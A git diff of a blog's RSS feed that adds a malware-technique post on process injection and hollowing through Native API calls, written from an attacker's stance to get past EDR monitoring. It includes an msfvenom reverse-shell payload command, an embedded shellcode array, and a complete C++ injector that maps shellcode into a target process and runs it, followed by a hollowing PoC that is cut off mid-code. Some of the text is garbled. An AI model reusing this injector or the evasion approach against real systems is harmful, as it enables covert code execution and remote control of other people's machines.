@@ -6,7 +6,617 @@
     <description>Recent content in Posts on rxOred&#39;s blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Mon, 13 Dec 2021 11:50:35 +0000</lastBuildDate><atom:link href="https://rxOred.github.io/post/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sat, 01 Jan 2022 10:21:31 +0000</lastBuildDate><atom:link href="https://rxOred.github.io/post/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Process Hollowing? not really</title>
+      <link>https://rxOred.github.io/post/malware/process-hollowing/process-hollowing/</link>
+      <pubDate>Sat, 01 Jan 2022 10:21:31 +0000</pubDate>
+      
+      <guid>https://rxOred.github.io/post/malware/process-hollowing/process-hollowing/</guid>
+      <description>(@bound by jademerien)
+Introduction Process hollowing is a process injection / evasion technique that is often used in malware. To name a few, struxnet, dridex.
+A malware that uses process hollowing starts a target ** process with CREATE_SUSPENDED flag enabled. Then using the handler it got from created the process, it hollows out the legitimate executable image from the target process&amp;rsquo;s memory.
+The problem However, malware tends to use the same set of APIs for this task.</description>
+      <content>&lt;p&gt;&lt;a href=&#34;https://www.deviantart.com/jademerien/art/Bound-855334634?comment=1%3A855334634%3A4959164323&#34;&gt;(@bound by jademerien)&lt;/a&gt;&lt;/p&gt;
+&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;Process hollowing is a process injection / evasion technique that is often
+used in malware. To name a few, struxnet, dridex.&lt;/p&gt;
+&lt;p&gt;A malware that uses process hollowing starts a target **
+process with &lt;strong&gt;CREATE_SUSPENDED&lt;/strong&gt; flag enabled. Then using the handler it
+got from created the process, it &lt;strong&gt;hollows out&lt;/strong&gt; the legitimate executable
+image from the target process&amp;rsquo;s memory.&lt;/p&gt;
+&lt;h1 id=&#34;the-problem&#34;&gt;The problem&lt;/h1&gt;
+&lt;p&gt;However, malware tends to use the same set of APIs for this task.
+Some of these APIs are,&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;- CreateProcessA
+- WriteProcessMemory
+- VirtualProtect
+- VirtualAlloc
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;And it is very well known that these APIs are often monitored by defense
+solutions.&lt;/p&gt;
+&lt;h1 id=&#34;the-solution&#34;&gt;The solution&lt;/h1&gt;
+&lt;p&gt;Well, there are solutions. For example, one can directly invoke syscalls
+without going through &lt;strong&gt;kernel32.dll&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Of course that&amp;rsquo;s good solution, but in this post, i wont talk about it
+since i&amp;rsquo;m here to talk about another not-well-known approach for process
+hollowing&lt;/p&gt;
+&lt;h2 id=&#34;background&#34;&gt;Background&lt;/h2&gt;
+&lt;p&gt;Since most defense solutions monitor API calls from user space, they are
+commonly known to hook WIN32API but not the Native API. Because of that,
+it would be more advantageous for us, attackers to implement the technique
+using NTAPI.&lt;/p&gt;
+&lt;p&gt;In order to understand the technique, one must understand how following
+functions from NTAPIs work.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;- NtCreateSection
+- NtMapViewOfSection
+- ZwUnmapViewOfSection
+- NtSetContextThread
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;For that purpose, we are going to write a small shellcode injector using some
+of above functions.&lt;/p&gt;
+&lt;p&gt;shellcode -&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;rxOred-aspiree :: ~ » msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=&amp;lt;ip&amp;gt; LPORT=&amp;lt;port&amp;gt; -f c -b \x00\x0a\x0d&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;winternl.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#pragma comment(lib, &amp;#34;ntdll&amp;#34;)
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buf[] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89\xe3&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x68\x6b\x74\x58\x20\x68\x74\x20\x72\x65\x68\x45\x3d\x67\x65&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x68\x54\x49\x54\x4c\x68\x72\x65\x6b\x74\x68\x67\x65\x74\x20&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x31\xc9\x88\x4c\x24\x16\x89\xe1\x31\xd2\x52\x53\x51\x52\xff&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd0\x31\xc0\x50\xff\x55\x08&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;argv[])
+{
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (argc &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) 
+    {
+        LARGE_INTEGER sectionSize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; { &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt; buf };
+        HANDLE sectionHandle &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
+        PVOID localSectionAddress &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL, remoteSectionAddress &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
+
+        &lt;span style=&#34;color:#75715e&#34;&gt;// create a read write execute memory region in the local process
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fNtCreateSection(
+                &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;sectionHandle, 
+                SECTION_ALL_ACCESS, 
+                NULL,
+                (PLARGE_INTEGER)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;sectionSize, 
+                PAGE_EXECUTE_READWRITE, 
+                SEC_COMMIT, NULL) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; STATUS_SUCCESS)
+        {
+            std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[x]Create section failed&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+        }
+
+
+        SIZE_T size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt; buf;
+
+        &lt;span style=&#34;color:#75715e&#34;&gt;// create a view of the memory section in the local process
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fNtMapViewOfSection(
+                sectionHandle, 
+                GetCurrentProcess(), 
+                &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;localSectionAddress, 
+                NULL, NULL, NULL, 
+                &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;size, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, NULL, 
+                PAGE_READWRITE) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; STATUS_SUCCESS)
+        {
+            std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[x]Create map failed&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+        }
+
+        HANDLE processHandle &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; OpenProcess(
+                PROCESS_ALL_ACCESS, 
+                FALSE, 
+                DWORD(atoi(argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])));
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (processHandle &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL)
+        {
+            std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[x] Open process failed&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+        }  
+        &lt;span style=&#34;color:#75715e&#34;&gt;// create a map view of the section in the target process
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fNtMapViewOfSection(
+                sectionHandle, 
+                processHandle, 
+                &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;remoteSectionAddress, 
+                NULL, NULL, NULL,
+                &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;size, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, NULL, 
+                PAGE_EXECUTE_READ) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; STATUS_SUCCESS)
+        {
+            std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[x]Create map failed&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+        }
+
+        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;remote section created&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;
+
+        memcpy(localSectionAddress, buf, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(buf));
+
+        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Shellcode injected at 0x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;hex &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; remoteSectionAddress &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;
+
+        CloseHandle(sectionHandle);
+        HANDLE targetThreadHandle &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
+        fRtlCreateUserThread(
+                processHandle, 
+                NULL, 
+                FALSE, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, 
+                remoteSectionAddress, 
+                NULL, 
+                &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;targetThreadHandle, NULL
+            );
+    }
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; 
+    {
+        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./whatever.exe &amp;lt;pid&amp;gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;NtCreateSection&lt;/code&gt; function creates a shared section of memory that two or
+more processes can read from and write into. The function expects ** address of an uninitalized section handle. This section handle is initialized
+by the function and will be used when referencing to that specific section&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;NtMapViewOfSection&lt;/code&gt; is the function that uses initliazed section handle
+return as the output parameter of &lt;strong&gt;NtCreateSection&lt;/strong&gt;. The function creates
+a mapping of the section referenced with &lt;strong&gt;section handle&lt;/strong&gt; in the process
+user specifies.&lt;/p&gt;
+&lt;p&gt;In the above snippet, &lt;code&gt;NtCreateSection&lt;/code&gt; is used to createe a section with
+permissions &lt;code&gt;PAGE_EXECUTE_READWRITE&lt;/code&gt; of size &lt;code&gt;sizeof buf&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;then two calls to &lt;code&gt;NtMapViewOfSection&lt;/code&gt; are used to map the section into
+local process and the remote process. Permissions for the mapping of
+local process is &lt;code&gt;PAGE_READWRITE&lt;/code&gt; while permissions for the remote
+process &amp;rsquo;s mapping is &lt;code&gt;PAGE_EXECUTE_READ&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;This clearly shows the advantage of NtCreateSection + NtMapViewOfSection
+over many other process injection techniques. Since memory is allocated
+in the target process with permissions of &lt;code&gt;PAGE_EXECUTE_READ&lt;/code&gt;, calls to
+&lt;code&gt;VirtualAlloc&lt;/code&gt; wont be required. This also helps against some EDR
+solutions&lt;/p&gt;
+&lt;p&gt;shellcode started crashing).&lt;/p&gt;
+&lt;p&gt;here&amp;rsquo;s the result.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/process-hollowing/1.png&#34; alt=&#34;remove this&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/process-hollowing/msgbox1.png&#34; alt=&#34;notepad messagebox&#34;&gt;&lt;/p&gt;
+&lt;p&gt;mapped section in remote process&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/process-hollowing/permissions1.png&#34; alt=&#34;remove this&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Now the APIs are understood, it is time to demonstrate the process
+hollowing technique.&lt;/p&gt;
+&lt;h2 id=&#34;implementation&#34;&gt;Implementation&lt;/h2&gt;
+&lt;p&gt;Before implementing it is essential to undersand what can be done and what
+we are going to do with the above injection technique.&lt;/p&gt;
+&lt;p&gt;Since this post is about process hollowing, anyone can guess we are going
+to hollow out the target process image and inject a shellcode using the
+above technique, but simply put, no.&lt;/p&gt;
+&lt;p&gt;The steps can be briefly described as follow.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;- Injecting the shellcode into target process
+- Retrieve ImageBaseAddress of the executable image
+- Read executable image of the remote process into a buffer
+- Unmap executable image from the process 
+- Hook somewhere of the copied image so it will jump to shellcode
+- Remap the section into the remote process using above techniques
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Here is the PoC code.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;winternl.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#pragma comment(lib, &amp;#34;ntdll&amp;#34;)
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#define SECTION_SIZE 0x1000
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;typedef&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
+    HRSRC shellcodeResource;
+    SIZE_T shellcodeSize;
+    BYTE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; shellcode;
+} SHELLCODE;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;typedef&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
+    HANDLE processHandle;
+    DWORD imageBaseAddress;
+    DWORD entryPoint;
+} HOST;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;#if !defined NTSTATUS
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;typedef&lt;/span&gt; LONG NTSTATUS;
+&lt;span style=&#34;color:#75715e&#34;&gt;#endif
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#define STATUS_SUCCESS 0
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;typedef&lt;/span&gt; CLIENT_ID&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; PCLIENT_ID;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; myNtCreateSection &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NTSTATUS(NTAPI&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(
+    OUT PHANDLE SectionHandle,
+    IN ULONG DesiredAccess,
+    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
+    IN PLARGE_INTEGER MaximumSize OPTIONAL,
+    IN ULONG PageAttributess,
+    IN ULONG SectionAttributes,
+    IN HANDLE FileHandle OPTIONAL
+    );
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; myNtMapViewOfSection &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NTSTATUS(NTAPI&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(
+    HANDLE SectionHandle,
+    HANDLE ProcessHandle,
+    PVOID&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; BaseAddress,
+    ULONG_PTR ZeroBits,
+    SIZE_T CommitSize,
+    PLARGE_INTEGER SectionOffset,
+    PSIZE_T ViewSize,
+    DWORD InheritDisposition,
+    ULONG AllocationType,
+    ULONG Win32Protect
+    );
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; myZwUnmapViewOfSection &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NTSTATUS(NTAPI&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(
+    IN HANDLE ProcessHandle,
+    IN PVOID BaseAddress
+    );
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; myNtGetContextThread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NTSTATUS(NTAPI&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;) (
+    IN HANDLE ThreadHandle,
+    OUT PCONTEXT Context
+    );
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; myNtSetContextThread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NTSTATUS(NTAPI&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;) (
+    IN HANDLE ThreadHandle,
+    IN PCONTEXT Context
+    );
+
+myNtCreateSection fNtCreateSection &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (myNtCreateSection)(GetProcAddress(
+    GetModuleHandleA(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ntdll&amp;#34;&lt;/span&gt;),
+    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;NtCreateSection&amp;#34;&lt;/span&gt;));
